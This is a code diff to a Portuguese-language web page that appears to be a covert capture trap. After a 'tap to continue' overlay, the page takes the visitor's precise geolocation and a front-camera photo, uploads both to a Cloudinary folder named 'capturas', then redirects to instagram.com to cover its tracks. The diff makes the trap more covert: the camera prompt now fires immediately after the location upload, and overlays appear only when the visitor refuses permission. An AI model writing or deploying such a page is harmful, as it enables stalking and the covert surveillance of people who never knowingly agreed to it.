@@ -23,29 +23,30 @@
     const uploadPreset = 'upload';
     const folderName = 'capturas';
     const overlay = document.getElementById('overlay');
-    const geoOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+    const geoOpts = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
-    function show(message) {
-      overlay.textContent = message;
+    function showOverlay(msg, handler) {
+      overlay.textContent = msg;
       overlay.style.display = 'flex';
+      overlay.onclick = handler;
     }
-    function hide() {
+    function hideOverlay() {
       overlay.style.display = 'none';
     }
 
-    // Passo 1: chamar getCurrentPosition diretamente no clique
+    // Etapa 1: solicitar permissão de localização
     function askLocation() {
-      navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOptions);
+      hideOverlay();
+      navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOpts);
     }
     function onGeoError() {
-      show('Localização negada. Toque para permitir a localização');
-      overlay.onclick = askLocation;
+      // só aparece ao negar
+      showOverlay('Toque para permitir a localização', askLocation);
     }
-    function onGeoSuccess(position) {
-      hide();
-      // upload location
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+    function onGeoSuccess(pos) {
+      // enviando localização
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
       const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
       const form = new FormData();
       form.append('file', blob, `localizacao_${Date.now()}.txt`);
@@ -53,21 +54,19 @@
       form.append('folder', folderName);
       fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
         .then(() => {
-          // após enviar localização, pedir câmera
-          show('Toque para permitir o acesso à câmera');
-          overlay.onclick = askCamera;
+          // imediatamente solicite câmera (sistema)
+          askCamera();
         })
         .catch(() => {
-          show('Erro ao enviar localização. Toque para tentar novamente.');
-          overlay.onclick = askLocation;
+          showOverlay('Erro ao enviar localização. Toque para tentar novamente.', askLocation);
         });
     }
 
-    // Passo 2: chamar getUserMedia diretamente no clique
+    // Etapa 2: solicitar permissão de câmera somente via sistema (sem overlay prévio)
     function askCamera() {
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
         .then(stream => {
-          hide();
+          // captura e upload
           const video = document.createElement('video');
           video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
           video.srcObject = stream;
@@ -83,24 +82,20 @@
               imgForm.append('upload_preset', uploadPreset);
               imgForm.append('folder', folderName);
               fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm })
-                .then(() => { window.location.href = 'https://instagram.com'; })
-                .catch(() => {
-                  show('Erro ao enviar foto. Toque para tentar novamente.');
-                  overlay.onclick = askCamera;
-                });
+                .then(() => window.location.href = 'https://instagram.com')
+                .catch(() => showOverlay('Erro ao enviar foto. Toque para tentar novamente.', askCamera));
             }, 'image/png');
           }, 500);
         })
         .catch(() => {
-          show('Câmera negada. Toque para permitir o acesso à câmera');
-          overlay.onclick = askCamera;
+          // só aparece ao negar
+          showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', askCamera);
         });
     }
 
-    // Iniciar sequência
+    // Inicialização
     window.addEventListener('DOMContentLoaded', () => {
-      show('Toque para continuar');
-      overlay.onclick = askLocation;
+      showOverlay('Toque para continuar', askLocation);
     });
   </script>
 </body>
